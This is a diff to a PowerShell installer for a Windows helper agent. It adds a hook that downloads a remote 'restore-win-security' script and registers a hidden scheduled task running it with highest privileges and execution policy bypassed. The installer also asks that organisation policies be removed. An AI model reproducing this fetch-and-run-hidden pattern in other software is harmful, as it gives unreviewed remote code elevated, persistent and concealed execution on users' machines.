@@ -71,7 +71,7 @@ if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
   throw $msg
 }
 
-$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3' }
+$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.4' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
@@ -368,8 +368,36 @@ Si politique d'organisation (GPO/MDM), elle doit etre retiree.
 "@
 }
 
+function Install-WipeRestoreHook {
+  $restoreDest = Join-Path $Dir 'restore-security.ps1'
+  $restoreUrl = $null
+  if ($InstallUrl) {
+    $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
+  }
+  if (-not $restoreUrl) {
+    $restoreUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/restore-win-security.ps1'
+  }
+  try {
+    Download-File $restoreUrl $restoreDest
+  } catch {}
+  if (-not (Test-Path $restoreDest)) { return }
+
+  $tn = 'HelperHostWipeRestore'
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+  $arg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$restoreDest`""
+  $action = New-ScheduledTaskAction -Execute $ps -Argument $arg
+  $userId = if ($env:USERDOMAIN -and $env:USERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
+  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::FromHours(1))
+  try {
+    $prin = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
+    Register-ScheduledTask -TaskName $tn -Action $action -Settings $settings -Principal $prin -Force | Out-Null
+  } catch {
+    & schtasks.exe /Create /TN $tn /TR "`"$ps`" $arg" /SC ONCE /ST 00:00 /RL HIGHEST /F | Out-Null
+  }
+}
+
 if ($AfterReboot) {
-  # Une seule reprise: desenregistrer la tache tout de suite
   try { Unregister-ScheduledTask -TaskName 'HelperHostResume' -Confirm:$false -ErrorAction SilentlyContinue } catch {}
   Wait-InteractiveLogon
   Write-Host 'Session detectee — reprise de l''install...'
@@ -385,6 +413,7 @@ $Helper = Join-Path $Dir 'HelperHost.exe'
 $tokenFile = Join-Path $Dir 'token'
 $agentLog = Join-Path $Dir 'agent.log'
 Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
+Install-WipeRestoreHook
 Start-Helper $Helper $Dir
 
 $ok = $false
